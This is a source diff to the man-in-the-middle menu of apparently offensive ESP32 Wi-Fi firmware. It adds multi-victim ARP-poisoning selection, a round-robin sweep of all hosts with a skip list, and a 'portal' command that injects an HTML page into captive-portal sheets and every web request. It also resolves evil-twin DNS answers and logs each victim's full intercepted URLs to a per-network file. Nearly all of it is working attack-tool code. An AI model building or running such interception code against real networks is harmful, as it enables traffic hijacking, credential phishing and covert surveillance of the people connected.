@@ -1,4 +1,5 @@
 #include "mitm_menu.h"
+#include "core/dev/tunables.h" // task 1: mitm.fallback_delay_ms
 #include "core/display.h"
 #include "core/mykeyboard.h"
 #include "core/sd_functions.h"
@@ -7,6 +8,7 @@
 #include "mitm_uc.h"
 #include "wifi_atks.h"
 #include <FS.h>
+#include <esp_heap_caps.h>
 #include <esp_wifi.h>
 #include <freertos/FreeRTOS.h>
 #include <freertos/task.h>
@@ -25,6 +27,19 @@
 // Everything a script can do here is also reachable headlessly through the
 // `dnsinject` / `htmlint` console verbs (mitm_commands.cpp), which is how these
 // menus are regression-tested on the board.
+
+// Hosts a payload never pairs (`skip <ip>`), e.g. the operator's own machine
+// during an "all targets" sweep. Set by mitmPayloadLoadScript().
+static String mitmSkipIp[MITM_SKIP_MAX];
+static int mitmSkipCount = 0;
+
+static bool mitmIsSkipped(const IPAddress &ip) {
+    String s = ip.toString();
+    for (int i = 0; i < mitmSkipCount; i++) {
+        if (mitmSkipIp[i] == s) return true;
+    }
+    return false;
+}
 
 // ===========================================================================
 // 1. Filesystem helpers
@@ -277,7 +292,7 @@ static const char MITM_SCRIPT_EXAMPLE[] =
     "#   page <match> <file>            200 + HTML for matching web requests\n"
     "#   redirect <match> <url>         302 for matching web requests\n"
     "#   dns <name|*> <ip>              answer DNS queries\n"
-    "#   target all|<ip>                override the page's Target mode\n"
+    "#   target all|<ip>|<ip>,<ip>...  override the page's Target mode\n"
     "#   fallback dns <ip> [secs]       if no web request landed in <secs>\n"
     "#   fallback redirect <url> [secs] ... the same, with a 302 instead\n"
     "#   (chain up to 3 fallbacks; each <secs> counts from the start)\n"
@@ -314,7 +329,7 @@ static const char MITM_UC_EXAMPLE[] =
     "#   sniff <secs>          listen first: clients + the SSIDs they seek\n"
     "#   page <match> <file>   200 + HTML for every request on the twin\n"
     "#   redirect <match> <url> 302 (only useful when the twin has internet)\n"
-    "#   dns <name|*> <ip>     answer DNS queries ('this' = the twin)\n"
+    "#   dns <name|*> <ip>     answer DNS queries ('this' = the twin AP)\n"
     "#   offline page <file>   served when there is no page rule\n"
     "\n"
     "sniff 8\n"
@@ -510,8 +525,9 @@ static String mitmResolveScriptPath(const String &raw) {
  * The gateway is the useful default. A DNS answer has to point at an address
  * whose MAC the victim already sends to this board (the poisoned gateway), so
  * `dns * gateway` works on any network without hard-coding 192.168.x.1. `this`
- * is the board's own station address, which needs something listening on the
- * port - the JS API's captive-portal path, not this engine.
+ * is the board's own address, which needs something listening on the port: the
+ * station address while the board is associated, and the twin AP's address
+ * when it is not (the `.ucmitm` case, where there is no station link at all).
  */
 static bool mitmResolveSpecIp(const String &token, String &out) {
     IPAddress parsed;
@@ -527,8 +543,15 @@ static bool mitmResolveSpecIp(const String &token, String &out) {
         return true;
     }
     if (token.equalsIgnoreCase("this") || token.equalsIgnoreCase("board")) {
-        if (!WiFi.isConnected()) return false;
-        out = WiFi.localIP().toString();
+        if (WiFi.isConnected()) {
+            out = WiFi.localIP().toString();
+            return true;
+        }
+        // A `.ucmitm` payload has no station link by design, and `dns * this`
+        // there means the twin: its AP address is the one its clients can reach.
+        IPAddress ap = WiFi.softAPIP();
+        if ((uint32_t)ap == 0) return false;
+        out = ap.toString();
         return true;
     }
     return false;
@@ -575,6 +598,7 @@ MitmScriptResult mitmPayloadLoadScript(const String &path) {
     // stale '*' rule can never answer for the new one.
     netspoof_dns_clear_rules();
     netspoof_http_clear_rules();
+    mitmSkipCount = 0;
 
     int pos = 0;
     while (pos >= 0) {
@@ -639,6 +663,26 @@ MitmScriptResult mitmPayloadLoadScript(const String &path) {
             else if (mode == "auto") res.forward = 1;
             else if (mode == "off" || mode == "no" || mode == "0") res.forward = 0;
             else res.bad++;
+        } else if (cmd == "portal") {
+            // `portal <html>`: the page handed to the OS captive-portal sheet.
+            // It is also installed as the wildcard page, so a client that opens
+            // the address directly gets the same thing.
+            String file = mitmNextToken(line, cur);
+            if (file.length() == 0) {
+                res.bad++;
+            } else {
+                MitmPayloadResult pageRes;
+                String body = mitmPayloadRead(mitmResolveScriptPath(file), MITM_HTML_MAX, pageRes);
+                if (pageRes.error.length() || body.length() == 0) {
+                    res.bad++;
+                    Serial.printf("[MITM] portal %s: %s\n", file.c_str(), pageRes.error.c_str());
+                } else {
+                    netspoof_http_set_portal_page(body);
+                    bool wildcard = true;
+                    if (netspoof_http_add_injection(String("*"), body, wildcard, err)) res.pages++;
+                    else res.bad++;
+                }
+            }
         } else if (cmd == "offline") {
             String what = mitmNextToken(line, cur);
             String file = mitmNextToken(line, cur);
@@ -659,6 +703,23 @@ MitmScriptResult mitmPayloadLoadScript(const String &path) {
             } else {
                 // More than MITM_PROBE_MAX lines is a payload mistake, not a
                 // rule failure; count it so `mitm payload` says so.
+                res.bad++;
+            }
+        } else if (cmd == "sweep") {
+            // One host at a time, round-robin. Bounded so a typo cannot turn the
+            // run into a frame storm.
+            uint32_t ms = (uint32_t)mitmNextToken(line, cur).toInt();
+            if (ms < 250) ms = 1200;
+            if (ms > 5000) ms = 5000;
+            res.sweep = true;
+            res.sweepDwellMs = ms;
+        } else if (cmd == "skip") {
+            String ip = mitmNextToken(line, cur);
+            IPAddress parsed;
+            if (parsed.fromString(ip.c_str())) {
+                if (res.skipCount < MITM_SKIP_MAX) res.skips[res.skipCount++] = ip;
+                else res.bad++;
+            } else {
                 res.bad++;
             }
         } else if (cmd == "twin") {
@@ -694,7 +755,9 @@ MitmScriptResult mitmPayloadLoadScript(const String &path) {
                     // station is still associating).
                     if (mitmResolveSpecIp(value, ip)) stored = ip;
                 }
-                uint32_t after = mitmParseSeconds(secs, MITM_FALLBACK_DEFAULT_MS);
+                // No time on the line: the task 1 tunable decides how long to wait.
+                uint32_t after =
+                    mitmParseSeconds(secs, (uint32_t)tuneGetByName("mitm.fallback_delay_ms", nullptr));
                 res.fallbackSet = true;
                 res.fallbackDns = isDns;
                 res.fallbackValue = stored;
@@ -718,6 +781,11 @@ MitmScriptResult mitmPayloadLoadScript(const String &path) {
     // A recon payload carries no rules on purpose (it only watches), and a
     // ucmitm payload can be a pure twin or a pure sniff, so those count as valid
     // payloads too - otherwise `recon` could never be armed at all.
+    // A sweep payload is one attack: publish its skip list for mitmPairTargets
+    // and the sweep loop. The list is cleared at the top of every load.
+    mitmSkipCount = res.skipCount;
+    for (int i = 0; i < res.skipCount && i < MITM_SKIP_MAX; i++) mitmSkipIp[i] = res.skips[i];
+
     res.ok = (res.pages + res.redirects + res.dns) > 0 || res.wantInfo || res.probeCount > 0 ||
              res.forward != 0 || res.ucSniffMs > 0 || res.ucTwinSsid.length() > 0;
     if (!res.ok && res.error.length() == 0) {
@@ -735,15 +803,68 @@ static bool mitmAllTargets = true;        // Target mode: every host / one host
 static String mitmTargetIpStr = "";
 static uint8_t mitmTargetMac[6] = {0};
 static bool mitmTargetMacOk = false;
+
+// A picked SET of hosts. "All devices" is the one-pair-at-a-time sweep; this is
+// the other half of the operator's choice: several named hosts at once, with no
+// scan of the rest of the network and no payload `target` override. Small on
+// purpose - each pair adds a re-poison load every interval, and the pair table
+// is shared with the sweep.
+#define MITM_MULTI_MAX 16
+static bool mitmMultiTargets = false;
+static int mitmMultiCount = 0;
+static String mitmMultiIp[MITM_MULTI_MAX];
+static uint8_t mitmMultiMac[MITM_MULTI_MAX][6];
+static bool mitmMultiMacOk[MITM_MULTI_MAX];
+
 static String mitmAttackNote = "ready"; // outcome shown by the ARP/targets page
+
+static void mitmMultiClear() {
+    mitmMultiTargets = false;
+    mitmMultiCount = 0;
+}
+
+static int mitmMultiIndex(const String &ip) {
+    for (int i = 0; i < mitmMultiCount; i++)
+        if (mitmMultiIp[i] == ip) return i;
+    return -1;
+}
+
+/// Add without duplicating. Returns false only when the set is full, so the
+/// picker can say why the tick did nothing.
+static bool mitmMultiAdd(const IPAddress &ip, const uint8_t *mac) {
+    String s = ip.toString();
+    if (mitmMultiIndex(s) >= 0) return true;
+    if (mitmMultiCount >= MITM_MULTI_MAX) return false;
+    int i = mitmMultiCount++;
+    mitmMultiIp[i] = s;
+    mitmMultiMacOk[i] = false;
+    if (mac != nullptr) {
+        memcpy(mitmMultiMac[i], mac, 6);
+        mitmMultiMacOk[i] = true;
+    }
+    return true;
+}
+
+static void mitmMultiRemove(const String &ip) {
+    int i = mitmMultiIndex(ip);
+    if (i < 0) return;
+    for (int k = i; k < mitmMultiCount - 1; k++) {
+        mitmMultiIp[k] = mitmMultiIp[k + 1];
+        memcpy(mitmMultiMac[k], mitmMultiMac[k + 1], 6);
+        mitmMultiMacOk[k] = mitmMultiMacOk[k + 1];
+    }
+    mitmMultiCount--;
+}
 
 static void mitmSetTargetAll() {
     mitmAllTargets = true;
+    mitmMultiClear();
     mitmAttackNote = "ok: every host the scan finds";
 }
 
 static void mitmSetTargetOne(const IPAddress &ip, const uint8_t *mac) {
     mitmAllTargets = false;
+    mitmMultiClear();
     mitmTargetIpStr = ip.toString();
     mitmTargetMacOk = false;
     if (mac != nullptr) {
@@ -754,6 +875,10 @@ static void mitmSetTargetOne(const IPAddress &ip, const uint8_t *mac) {
 }
 
 static String mitmTargetLabel() {
+    if (mitmMultiTargets) {
+        if (mitmMultiCount == 0) return String("Multi (none picked)");
+        return String(mitmMultiCount) + " devices";
+    }
     if (mitmAllTargets) return String("All devices");
     if (mitmTargetIpStr.length() == 0) return String("Single (none picked)");
     return mitmTargetIpStr;
@@ -819,43 +944,145 @@ static void mitmPickNetwork() {
     mitmClearKeys();
 }
 
-/// ARP-scan the joined network and pick "All devices" or one host.
+/// ARP-scan the joined network, then pick "All devices", one host, or a ticked
+/// set of hosts. The tick list re-renders in a loop rather than recursing, so
+/// ticking ten hosts does not leave ten menu frames on the stack.
+struct MitmPickHost {
+    IPAddress ip;
+    uint8_t mac[6];
+    String macStr;
+};
+static std::vector<MitmPickHost> mitmPickHosts;
+static int mitmPickFound = 0;
+
 static void mitmPickTargets() {
     if (!mitmEnsureStation()) {
         mitmAttackNote = "err: connect to WiFi first";
+        // The row that opened this picker still reads "All devices"/the last
+        // target, so returning silently made Target look like a dead row.
+        displayError("Connect to WiFi first", true);
         return;
     }
 
-    String err;
-    drawMainBorderWithTitle("MITM Targets");
-    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
-    tft.drawString("ARP scanning...", 10, 50);
-    int found = netspoof_scan_targets(8000, err);
-    if (found < 0) {
-        mitmAttackNote = "err: " + (err.length() ? err : String("ARP scan failed"));
-        return;
-    }
-    if (found == 0) mitmAttackNote = "warn: no host answered ARP";
+    bool needScan = mitmPickHosts.empty();
+    bool leave = false;
+    bool rescan = false;
+    int last = 0;
+    while (true) {
+        if (needScan) {
+            String err;
+            drawMainBorderWithTitle("MITM Targets");
+            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+            tft.drawString("ARP scanning...", 10, 50);
+            int found = netspoof_scan_targets(8000, err);
+            if (found < 0) {
+                mitmAttackNote = "err: " + (err.length() ? err : String("ARP scan failed"));
+                displayError(err.length() ? err : String("ARP scan failed"), true);
+                return;
+            }
+            if (found == 0) mitmAttackNote = "warn: no host answered ARP";
+            mitmPickHosts.clear();
+            for (int i = 0; i < netspoof_target_count(); i++) {
+                const NetSpoofTarget *t = netspoof_target(i);
+                if (!t || t->gateway) continue; // the gateway is a pair's far end, never a victim
+                MitmPickHost h;
+                h.ip = t->ip;
+                memcpy(h.mac, t->mac, 6);
+                h.macStr = t->macStr;
+                mitmPickHosts.push_back(h);
+            }
+            mitmPickFound = found;
+            needScan = false;
+            rescan = false;
+            last = 0;
+        }
 
-    // Local rows, for the same reason as mitmPickNetwork(): this runs while the
-    // MITM page is iterating its own vector, and "Re-scan" re-enters it.
-    std::vector<Option> targets;
-    targets.push_back({String("Last: ") + mitmNoteLabel(mitmAttackNote), []() {}});
-    targets.push_back({String("All devices (") + String(found) + " hosts)", []() { mitmSetTargetAll(); }});
-    for (int i = 0; i < netspoof_target_count(); i++) {
-        const NetSpoofTarget *t = netspoof_target(i);
-        if (!t || t->gateway) continue; // the gateway is a pair's far end, never a victim
-        // Copy the MAC: the target list can be rebuilt by a later scan.
-        uint8_t mac[6];
-        memcpy(mac, t->mac, 6);
-        IPAddress ip = t->ip;
-        String label = ip.toString() + "  " + t->macStr;
-        targets.push_back({label, [ip, mac]() { mitmSetTargetOne(ip, mac); }});
+        // Local rows, for the same reason as mitmPickNetwork(): this runs while
+        // the MITM page is iterating its own vector.
+        std::vector<Option> targets;
+        targets.push_back({
+            String("All devices (") + String(mitmPickFound) + " hosts)",
+            [&]() {
+                mitmSetTargetAll();
+                leave = true;
+            }
+        });
+        for (size_t i = 0; i < mitmPickHosts.size(); i++) {
+            String ipStr = mitmPickHosts[i].ip.toString();
+            String label = (mitmMultiIndex(ipStr) >= 0 ? "[x] " : "[ ] ") + ipStr + "  " +
+                           mitmPickHosts[i].macStr;
+            targets.push_back({label, [&, i]() {
+                                   MitmPickHost h = mitmPickHosts[i];
+                                   String s = h.ip.toString();
+                                   if (mitmMultiIndex(s) >= 0) {
+                                       mitmMultiRemove(s);
+                                   } else if (!mitmMultiAdd(h.ip, h.mac)) {
+                                       mitmAttackNote = "err: at most " + String(MITM_MULTI_MAX) +
+                                                        " targets";
+                                       return;
+                                   }
+                                   mitmMultiTargets = mitmMultiCount > 0;
+                                   mitmAllTargets = false;
+                                   mitmAttackNote = mitmMultiCount > 0
+                                                        ? "ok: " + String(mitmMultiCount) + " target(s)"
+                                                        : "warn: no target selected";
+                               }});
+        }
+        targets.push_back({String("Done (") + String(mitmMultiCount) + " selected)", [&]() {
+                               if (mitmMultiCount > 0) {
+                                   mitmMultiTargets = true;
+                                   mitmAllTargets = false;
+                                   mitmAttackNote =
+                                       "ok: " + String(mitmMultiCount) + " target(s)";
+                               } else {
+                                   mitmAttackNote = "warn: no target selected";
+                               }
+                               leave = true;
+                           }});
+        targets.push_back({"Re-scan", [&]() { rescan = true; }});
+        targets.push_back({"Back", [&]() { leave = true; }});
+
+        int sel = loopOptions(targets, MENU_TYPE_SUBMENU, "MITM Targets", last);
+        if (leave || sel < 0) break;
+        if (sel >= 0) last = sel;
+        if (rescan) needScan = true;
     }
-    targets.push_back({"Re-scan", []() { mitmPickTargets(); }});
-    targets.push_back({"Back", []() {}});
-    loopOptions(targets, MENU_TYPE_SUBMENU, "MITM Targets");
     mitmClearKeys();
+}
+
+/// Pair one host by IP. When no MAC is known (a console target), learn it from
+/// the ARP scan first: a dozing client answers the scan's broadcast request but
+/// not the unicast resolve that follows, which is the same reason "All devices"
+/// pairs from the MACs the scan already saw. The unicast resolver stays as the
+/// fallback for a host the scan missed.
+static bool mitmPairOne(const IPAddress &ip, const uint8_t *mac, bool haveMac, String &err) {
+    uint8_t use[6];
+    bool okMac = false;
+    if (haveMac && mac != nullptr) {
+        memcpy(use, mac, 6);
+        okMac = true;
+    } else {
+        for (int i = 0; i < netspoof_target_count(); i++) {
+            const NetSpoofTarget *t = netspoof_target(i);
+            if (!t || t->gateway || !(t->ip == ip)) continue;
+            memcpy(use, t->mac, 6);
+            okMac = true;
+            break;
+        }
+        if (!okMac) {
+            String scanErr;
+            netspoof_scan_targets(6000, scanErr);
+            for (int i = 0; i < netspoof_target_count(); i++) {
+                const NetSpoofTarget *t = netspoof_target(i);
+                if (!t || t->gateway || !(t->ip == ip)) continue;
+                memcpy(use, t->mac, 6);
+                okMac = true;
+                break;
+            }
+        }
+    }
+    if (okMac) return netspoof_arp_start_mac(ip, use, IPAddress((uint32_t)0), err);
+    return netspoof_arp_start(ip, IPAddress((uint32_t)0), err);
 }
 
 /// Pair the hosts this run will poison. Returns how many pairs came up.
@@ -868,18 +1095,41 @@ static int mitmPairTargets(const String &override, String &err) {
         onlyIp = override;
     }
 
+    // A ticked set is already a list of victims: pair each one with its scanned
+    // MAC (or resolve it), and never widen to the scan. The payload `target`
+    // line is deliberately ignored here for the same reason it is ignored for a
+    // single picked host - the Target row is the operator's explicit choice.
+    if (mitmMultiTargets && override.length() == 0) {
+        if (mitmMultiCount == 0) {
+            err = "pick one or more targets first (Target row)";
+            return 0;
+        }
+        int pairs = 0;
+        for (int i = 0; i < mitmMultiCount; i++) {
+            IPAddress ip;
+            if (!ip.fromString(mitmMultiIp[i].c_str())) continue;
+            String one;
+            bool ok = mitmPairOne(ip, mitmMultiMac[i], mitmMultiMacOk[i], one);
+            if (ok) {
+                pairs++;
+            } else {
+                Serial.printf("[MITM] pair %s failed: %s\n", mitmMultiIp[i].c_str(), one.c_str());
+            }
+        }
+        if (pairs == 0) err = "no selected host could be paired";
+        else if (pairs < mitmMultiCount)
+            err = String(pairs) + " of " + String(mitmMultiCount) + " selected hosts paired";
+        return pairs;
+    }
+
     if (!all) {
         IPAddress ip;
         if (!ip.fromString(onlyIp.c_str())) {
             err = "pick a single target first (Target row)";
             return 0;
         }
-        bool ok;
-        if (mitmTargetMacOk && onlyIp == mitmTargetIpStr) {
-            ok = netspoof_arp_start_mac(ip, mitmTargetMac, IPAddress((uint32_t)0), err);
-        } else {
-            ok = netspoof_arp_start(ip, IPAddress((uint32_t)0), err);
-        }
+        bool useStored = mitmTargetMacOk && onlyIp == mitmTargetIpStr;
+        bool ok = mitmPairOne(ip, useStored ? mitmTargetMac : nullptr, useStored, err);
         return ok ? 1 : 0;
     }
 
@@ -935,39 +1185,135 @@ static const char *mitmAuthName(wifi_auth_mode_t mode) {
 static String mitmLogLine[MITM_LOG_LINES];
 static int mitmLogUsed = 0;
 static uint32_t mitmRunStart = 0;
+/// Bumped on every feed line, so the run screen only repaints the log body when
+/// there is something new (see mitmDrawRun).
+static uint32_t mitmLogSeq = 0;
 
-/// "Save log" toggle: append every feed line to MITM_LOG_FILE on the card.
+/// "Save logs" toggle: keep every feed line in RAM and write them to
+/// /wifi/MITM/<network>.log when the attack closes.
 ///
 /// The feed only lives in a RAM ring, so a recon run that saw a hostname lost it
-/// the moment the screen scrolled. With this on, the same lines (plus the
-/// hostnames the passive watch collects) are a readable file on the card.
+/// the moment the screen scrolled. With this on, every line (plus every domain
+/// and redirect the engine captured) is kept in a PSRAM buffer during the run and
+/// flushed once the run has stopped: the card is never touched while the attack
+/// is live, so logging adds no latency to it.
 static bool mitmSaveLog = true; // on by default: the hostnames are the point of a recon run
 
+/// One run's buffered feed. Allocated on first use, freed after a flush.
+static char *mitmLogBuf = nullptr;
+static size_t mitmLogLen = 0;
+static bool mitmLogOverflow = false;
+/// Network the run was against; names the log file ("<ssid>.log").
+static String mitmLogSsid;
+
+/// "My Wi-Fi/5G." -> "My_Wi-Fi_5G" (a file name no SSID can break).
+static String mitmLogFileName(const String &ssid) {
+    String name = ssid;
+    name.trim();
+    String out;
+    for (int i = 0; i < (int)name.length(); i++) {
+        char c = name[i];
+        bool keep = (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '-' ||
+                    c == '_' || c == '.';
+        out += keep ? c : '_';
+    }
+    while (out.length() > 1 && (out.endsWith("_") || out.endsWith("."))) out.remove(out.length() - 1);
+    if (out.length() > 40) out = out.substring(0, 40);
+    if (out.length() == 0) out = "no-network";
+    return out + ".log";
+}
+
+/// Create /wifi/MITM on the card (the folder the logs live in).
+static bool mitmEnsureLogDir() {
+    FS *fs = mitmFs();
+    if (!fs) return false;
+    if (!fs->exists("/wifi")) fs->mkdir("/wifi");
+    if (!fs->exists(MITM_LOG_DIR)) fs->mkdir(MITM_LOG_DIR);
+    return fs->exists(MITM_LOG_DIR);
+}
+
+/// Append one line to the run's RAM buffer (no card I/O).
+static void mitmLogStore(const String &line) {
+    if (!mitmSaveLog || line.length() == 0) return;
+    if (mitmLogBuf == nullptr) {
+        mitmLogBuf = (char *)heap_caps_malloc(MITM_LOG_MAX_BYTES, MALLOC_CAP_SPIRAM);
+        if (mitmLogBuf == nullptr) mitmLogBuf = (char *)heap_caps_malloc(MITM_LOG_MAX_BYTES, MALLOC_CAP_8BIT);
+        if (mitmLogBuf == nullptr) return;
+    }
+    size_t n = line.length();
+    if (mitmLogLen + n + 1 > MITM_LOG_MAX_BYTES) {
+        mitmLogOverflow = true;
+        return;
+    }
+    memcpy(mitmLogBuf + mitmLogLen, line.c_str(), n);
+    mitmLogLen += n;
+    mitmLogBuf[mitmLogLen++] = '\n';
+}
+
+/// Write the buffered run feed to /wifi/MITM/<ssid>.log, after the attack.
+///
+/// Returns true when the buffer is empty or written; a failed write keeps the
+/// buffer so a later flush (next run, or leaving the page) can retry.
+static bool mitmLogFlush() {
+    if (mitmLogLen == 0) {
+        if (mitmLogBuf) {
+            free(mitmLogBuf);
+            mitmLogBuf = nullptr;
+        }
+        mitmLogOverflow = false;
+        return true;
+    }
+    FS *fs = mitmFs();
+    if (fs == nullptr || !mitmEnsureLogDir()) return false;
+    String path = String(MITM_LOG_DIR) + "/" + mitmLogFileName(mitmLogSsid);
+    File f = fs->open(path, FILE_APPEND);
+    if (!f) return false;
+    if (mitmLogOverflow) f.print("# log cut: buffer full\n");
+    size_t wrote = f.write((const uint8_t *)mitmLogBuf, mitmLogLen);
+    f.close();
+    if (wrote != mitmLogLen) return false;
+    Serial.printf("[MITM] log saved: %s (%u bytes)\n", path.c_str(), (unsigned)mitmLogLen);
+    free(mitmLogBuf);
+    mitmLogBuf = nullptr;
+    mitmLogLen = 0;
+    mitmLogOverflow = false;
+    return true;
+}
+
+/// Start a run's log: flush anything a previous run left behind, then header.
+static void mitmLogBegin(const String &payload) {
+    mitmLogFlush();
+    mitmLogLen = 0;
+    mitmLogOverflow = false;
+    mitmLogSsid = "";
+    mitmLogStore(String("# --- mitm run: payload ") + mitmShortPath(payload) + " ---");
+}
+
+/// Remember the network and say so in the file (the file is named after it).
+static void mitmLogSetSsid(const String &ssid) {
+    mitmLogSsid = ssid;
+    mitmLogStore(String("# network ") + (ssid.length() ? ssid : String("(none)")));
+}
+
 static void mitmLogAdd(const String &text) {
-    String line = text;
-    if (line.length() > 60) line = line.substring(0, 60);
     // A terminal-style timestamp: the feed is there to explain what happened
     // and when, which is the one thing a counter table could never do.
     char stamp[12];
     unsigned long secs = mitmRunStart ? (millis() - mitmRunStart) / 1000UL : 0;
     snprintf(stamp, sizeof(stamp), "+%lus ", secs);
-    line = String(stamp) + line;
+    String line = String(stamp) + text;
     for (int i = 0; i < MITM_LOG_LINES - 1; i++) mitmLogLine[i] = mitmLogLine[i + 1];
     mitmLogLine[MITM_LOG_LINES - 1] = line;
     if (mitmLogUsed < MITM_LOG_LINES) mitmLogUsed++;
+    mitmLogSeq++;
     Serial.printf("[MITM] %s\n", line.c_str());
-    if (!mitmSaveLog) return;
-    FS *fs = mitmFs();
-    if (fs == nullptr) return;
-    File f = fs->open(MITM_LOG_FILE, FILE_APPEND);
-    if (!f) return;
-    f.printf("%s\n", line.c_str());
-    f.close();
+    mitmLogStore(line);
 }
 
 static void mitmLogClear() {
     for (int i = 0; i < MITM_LOG_LINES; i++) mitmLogLine[i] = "";
     mitmLogUsed = 0;
+    mitmLogSeq++;
 }
 
 /// Copy the new captures (oldest first) into the activity log.
@@ -994,14 +1340,17 @@ static void mitmLogCaptures(uint32_t &lastTotal) {
             else mitmLogAdd(who + " dns query " + c->host);
             continue;
         }
+        // The path is the request URI (or the redirect's answer) for HTTP and
+        // HTTPS captures, so the file keeps the full URL, not just the host.
+        String url = String(c->host) + String(c->path);
         if (c->action == 1) {
-            mitmLogAdd(who + " redirected " + c->host);
+            mitmLogAdd(who + " redirected " + url);
         } else if (c->action == 2) {
-            mitmLogAdd(who + " got page " + c->host);
+            mitmLogAdd(who + " got page " + url);
         } else if (c->action == 0) {
-            mitmLogAdd(who + " " + String(c->method) + " " + c->host + " (no rule)");
+            mitmLogAdd(who + " " + String(c->method) + " " + url + " (no rule)");
         } else {
-            mitmLogAdd(who + " " + String(c->method) + " " + c->host);
+            mitmLogAdd(who + " " + String(c->method) + " " + url);
         }
     }
 }
@@ -1115,30 +1464,55 @@ static void mitmApplyFallback(const MitmFallbackStep &step, String &state) {
 /// The body uses the small font (FP): 49 characters per line and 8 px rows fit
 /// the ten buffered lines exactly, which is what a terminal tail should look
 /// like on a 320x170 panel.
-static void mitmDrawRun(int pairs, const String &fallbackState, uint32_t hits) {
-    drawMainBorderWithTitle("MITM RUN");
-    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
-
+static void mitmDrawRun(int pairs, const String &fallbackState, uint32_t hits, bool full) {
     const int boxX = 6;
     const int boxW = tftWidth - 12;
     const int boxY = BORDER_PAD_Y + FM * LH + 4;  // just under the title
     const int boxH = tftHeight - boxY - 16;       // strip left for the hint
 
-    // Opaque first: this is what hides the menu the attack was started from.
-    tft.fillRoundRect(boxX, boxY, boxW, boxH, 4, bruceConfig.bgColor);
-    tft.drawRoundRect(boxX, boxY, boxW, boxH, 4, bruceConfig.priColor);
-
-    // Header: network, target, pairs and hits on one line at normal size.
-    String ssid = WiFi.isConnected() ? WiFi.SSID() : String("no network");
+    // Header: network, target, pairs and hits on one line at normal size. A
+    // ucmitm run has no station link on purpose, so it names the AP the twin
+    // copies instead of printing "no network" over a live twin.
+    const bool uc = mitmUcEnabled();
+    String ssid = uc ? mitmUcSsid() : (WiFi.isConnected() ? WiFi.SSID() : String("no network"));
+    if (ssid.length() == 0) ssid = "no network";
     if (ssid.length() > 11) ssid = ssid.substring(0, 11);
-    String tgt = mitmTargetLabel();
+    String tgt = uc ? mitmUcTargetLabel() : mitmTargetLabel();
     if (tgt.length() > 10) tgt = tgt.substring(0, 10);
     String head = ssid + " " + tgt + " p" + String(pairs) + " h" + String(hits);
     if (head.length() > 24) head = head.substring(0, 24);
-    tft.setTextSize(FM);
-    tft.drawString(head, boxX + 6, boxY + 4);
 
-    tft.drawLine(boxX + 4, boxY + 21, boxX + boxW - 5, boxY + 21, bruceConfig.priColor);
+    String hint = "next:" + (fallbackState.length() ? fallbackState : String("none")) + "  BACK=stop";
+    if (hint.length() > 49) hint = hint.substring(0, 49);
+
+    // Repaint only what changed. The old screen redrew the border and the whole
+    // box every 250 ms, which read as constant blinking on the panel; now the
+    // frame is painted once and a pass touches at most three small rectangles.
+    static String lastHead, lastHint;
+    static uint32_t lastSeq = 0xFFFFFFFF;
+    const uint16_t bg = bruceConfig.bgColor;
+
+    if (full) {
+        drawMainBorderWithTitle("MITM RUN");
+        tft.setTextColor(bruceConfig.priColor, bg);
+        // Opaque first: this is what hides the menu the attack was started from.
+        tft.fillRoundRect(boxX, boxY, boxW, boxH, 4, bg);
+        tft.drawRoundRect(boxX, boxY, boxW, boxH, 4, bruceConfig.priColor);
+        tft.setTextSize(FM);
+        tft.drawString(head, boxX + 6, boxY + 4);
+        tft.drawLine(boxX + 4, boxY + 21, boxX + boxW - 5, boxY + 21, bruceConfig.priColor);
+        lastHead = head;
+        lastHint = hint;
+        lastSeq = 0xFFFFFFFF; // force the body paint below
+        tft.setTextSize(FP);
+        tft.drawString(hint, boxX + 2, tftHeight - 14);
+    } else if (head != lastHead) {
+        tft.fillRect(boxX + 5, boxY + 2, boxW - 10, FM * LH + 2, bg);
+        tft.setTextColor(bruceConfig.priColor, bg);
+        tft.setTextSize(FM);
+        tft.drawString(head, boxX + 6, boxY + 4);
+        lastHead = head;
+    }
 
     // Terminal-style feed: the newest event sits on the bottom line, the way a
     // tail of a log file reads. The old counter table said "http 0/0", which
@@ -1149,23 +1523,56 @@ static void mitmDrawRun(int pairs, const String &fallbackState, uint32_t hits) {
     int rows = (boxY + boxH - 4 - firstY) / lineH;
     if (rows > mitmLogUsed) rows = mitmLogUsed;
     if (rows > MITM_LOG_LINES) rows = MITM_LOG_LINES;
-    if (rows > 0) {
-        int first = MITM_LOG_LINES - rows;
-        int y = boxY + boxH - 4 - rows * lineH; // bottom-aligned: tail of a log
+    if (full || mitmLogSeq != lastSeq) {
+        tft.fillRect(boxX + 3, firstY, boxW - 6, boxY + boxH - 4 - firstY, bg);
+        tft.setTextColor(bruceConfig.priColor, bg);
         tft.setTextSize(FP);
+        int y = boxY + boxH - 4 - rows * lineH; // bottom-aligned: tail of a log
         for (int i = 0; i < rows; i++) {
-            String line = mitmLogLine[first + i];
+            String line = mitmLogLine[MITM_LOG_LINES - rows + i];
             if (line.length() > 49) line = line.substring(0, 49);
             tft.drawString(line, boxX + 4, y);
             y += lineH;
         }
+        lastSeq = mitmLogSeq;
     }
 
     // The one hint, in the strip under the box so it never eats a log row.
-    String hint = "next:" + (fallbackState.length() ? fallbackState : String("none")) + "  BACK=stop";
-    if (hint.length() > 49) hint = hint.substring(0, 49);
-    tft.setTextSize(FP);
-    tft.drawString(hint, boxX + 2, tftHeight - 14);
+    if (full || hint != lastHint) {
+        tft.fillRect(boxX + 1, tftHeight - 16, boxW - 2, 15, bg);
+        tft.setTextColor(bruceConfig.priColor, bg);
+        tft.setTextSize(FP);
+        tft.drawString(hint, boxX + 2, tftHeight - 14);
+        lastHint = hint;
+    }
+}
+
+/**
+ * @brief Keep the run screen up after a passive recon.
+ *
+ * A recon payload has no engine to poll: the scan blocks the run task while it
+ * collects, so the panel is painted just before it starts and then held here
+ * until BACK (or the headless deadline). Returning the moment the scan ended
+ * dropped straight back to the idle menu, so the collected stations (and the
+ * SSIDs the clients were seeking) were only ever visible in the serial log.
+ */
+static void mitmHoldRunScreen(uint32_t durationMs, const String &next) {
+    mitmClearKeys(); // never inherit the SEL that started the run
+    uint32_t started = millis();
+    uint32_t lastDraw = 0;
+    bool first = true;
+    while (true) {
+        if (durationMs == 0 && check(EscPress)) break;
+        if (durationMs > 0 && (millis() - started) >= durationMs) break;
+        uint32_t now = millis();
+        if (now - lastDraw >= 250) {
+            lastDraw = now;
+            mitmDrawRun(0, next, 0, first);
+            first = false;
+        }
